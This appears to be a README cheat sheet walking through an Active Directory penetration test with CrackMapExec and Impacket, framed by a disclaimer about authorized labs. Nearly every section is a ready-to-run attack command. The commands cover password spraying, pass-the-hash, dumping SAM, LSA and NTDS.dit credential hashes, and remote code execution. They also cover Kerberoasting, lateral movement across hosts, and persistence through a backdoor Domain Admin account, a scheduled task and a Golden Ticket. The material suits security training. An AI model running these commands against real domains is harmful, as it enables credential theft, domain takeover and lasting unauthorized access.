# Active Directory Pentest – CrackMapExec & Impacket

> **DISCLAIMER**: This README is intended **only for authorized penetration testing labs** where you have explicit permission. All examples assume a controlled lab environment.

All private IPs are replaced with **`$target`**.

---

## 1. Enumeration Phase

### 1.1 SMB Enumeration (Unauthenticated)

```bash
crackmapexec smb $target
```

**Explanation**: Identifies SMB availability, domain name, OS version, and whether SMB signing is enabled.

---

### 1.2 SMB Enumeration with Credentials

```bash
crackmapexec smb $target -u user -p password
```

**Explanation**: Authenticates to SMB to enumerate domain info, privileges, and access level.

---

### 1.3 Enumerate Users

```bash
crackmapexec smb $target -u user -p password --users
```

**Explanation**: Retrieves domain users using authenticated SMB access.

---

### 1.4 Enumerate Groups

```bash
crackmapexec smb $target -u user -p password --groups
```

**Explanation**: Lists domain groups and helps identify privileged roles.

---

### 1.5 Enumerate Logged-on Users

```bash
crackmapexec smb $target -u user -p password --loggedon-users
```

**Explanation**: Shows which users are currently logged on to the target host.

---

### 1.6 Enumerate Shares

```bash
crackmapexec smb $target -u user -p password --shares
```

**Explanation**: Lists SMB shares and their access permissions.

---

### 1.7 LDAP Enumeration

```bash
crackmapexec ldap $target -u user -p password
```

**Explanation**: Enumerates LDAP information such as domain structure and policies.

---

## 2. Credential Access / Breaching Phase

### 2.1 Password Spraying

```bash
crackmapexec smb $target -u users.txt -p 'Password123'
```

**Explanation**: Tests one password across many users to find weak credentials.

---

### 2.2 NTLM Hash Authentication (Pass-the-Hash)

```bash
crackmapexec smb $target -u user -H NTLM_HASH
```

**Explanation**: Authenticates using NTLM hash without knowing the clear-text password.

---

### 2.3 Dumping SAM (Local Admin Required)

```bash
crackmapexec smb $target -u admin -p password --sam
```

**Explanation**: Extracts local account hashes from the SAM database.

---

### 2.4 Dumping LSA Secrets

```bash
crackmapexec smb $target -u admin -p password --lsa
```

**Explanation**: Retrieves cached credentials and secrets stored in LSA.

---

### 2.5 Dumping NTDS.dit (Domain Admin)

```bash
crackmapexec smb $target -u administrator -p password --ntds
```

**Explanation**: Dumps all Active Directory domain hashes.

---

## 3. Exploitation Phase (Impacket)

### 3.1 Remote Command Execution (PsExec)

```bash
impacket-psexec domain/user:password@$target
```

**Explanation**: Executes commands remotely using SMB service creation.

---

### 3.2 Remote Command Execution (WMI)

```bash
impacket-wmiexec domain/user:password@$target
```

**Explanation**: Executes commands using WMI, often stealthier than PsExec.

---

### 3.3 Remote Command Execution (SMBExec)

```bash
impacket-smbexec domain/user:password@$target
```

**Explanation**: Executes commands via SMB without creating a service.

---

### 3.4 Pass-the-Hash with Impacket

```bash
impacket-psexec domain/user@$target -hashes :NTLM_HASH
```

**Explanation**: Executes commands using NTLM hash authentication.

---

### 3.5 Kerberoasting

```bash
impacket-GetUserSPNs domain/user:password -dc-ip $target -request
```

**Explanation**: Extracts Kerberos service tickets for offline password cracking.

---

### 3.6 AS-REP Roasting

```bash
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip $target
```

**Explanation**: Retrieves AS-REP hashes for users without Kerberos pre-authentication.

---

## 4. Privilege Escalation & Lateral Movement

### 4.1 Enumerate Admin Access

```bash
crackmapexec smb $target -u user -p password --admin
```

**Explanation**: Checks if the user has local administrator privileges.

---

### 4.2 Lateral Movement with CME

```bash
crackmapexec smb targets.txt -u admin -H NTLM_HASH -x "whoami"
```

**Explanation**: Executes a command across multiple hosts using lateral movement.

---

## 5. Persistence Phase

### 5.1 Add New Domain Admin User

```bash
crackmapexec smb $target -u administrator -p password -x "net user backdoor Passw0rd! /add /domain && net group \"Domain Admins\" backdoor /add /domain"
```

**Explanation**: Creates a new domain admin account for persistence.

---

### 5.2 Scheduled Task Persistence

```bash
crackmapexec smb $target -u admin -p password -x "schtasks /create /sc onlogon /tn backdoor /tr cmd.exe"
```

**Explanation**: Establishes persistence via scheduled task execution.

---

### 5.3 Golden Ticket (Advanced)

```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local backdoor
```

**Explanation**: Generates a Golden Ticket for long-term domain persistence.

---

## 6. Cleanup (Recommended)

```bash
crackmapexec smb $target -u administrator -p password -x "net user backdoor /delete /domain"
```

**Explanation**: Removes test accounts and cleans up after the engagement.

---

## Conclusion

This README provides a **structured, end-to-end Active Directory pentest workflow** using CrackMapExec and Impacket, covering enumeration, breaching, exploitation, lateral movement, and persistence in an authorized lab environment.
